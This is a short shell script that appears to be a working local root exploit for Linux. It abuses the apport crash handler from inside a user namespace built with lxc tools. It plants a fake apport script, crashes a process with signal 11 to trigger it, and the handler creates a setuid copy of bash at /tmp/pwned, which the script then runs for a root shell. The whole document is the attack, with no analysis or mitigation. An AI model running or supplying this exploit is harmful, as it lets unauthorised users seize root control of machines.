TEMPDIR=$(mktemp -d)

cd ${TEMPDIR}

cp /bin/busybox .

mkdir -p dev mnt usr/share/apport

(
cat << EOF
#!/busybox sh
(
cp /mnt/1/root/bin/bash /mnt/1/root/tmp/pwned
chmod 5755 /mnt/1/root/tmp/pwned
) 
EOF

) > usr/share/apport/apport

chmod +x usr/share/apport/apport

(
cat << EOF
mount -o bind . .
cd .
mount --rbind /proc mnt
touch dev/null
pivot_root . .
./busybox sleep 500 &
SLEEP=\$!
./busybox sleep 1
./busybox kill -11 \$SLEEP
./busybox sleep 5
EOF
) | lxc-usernsexec -m u:0:$(id -u):1 -m g:0:$(id -g):1 2>&1 >/dev/null -- \
    lxc-unshare -s "MOUNT|PID|NETWORK|UTSNAME|IPC" -- /bin/sh 2>&1 >/dev/null

/tmp/pwned -p

rm -Rf ${TEMPDIR}
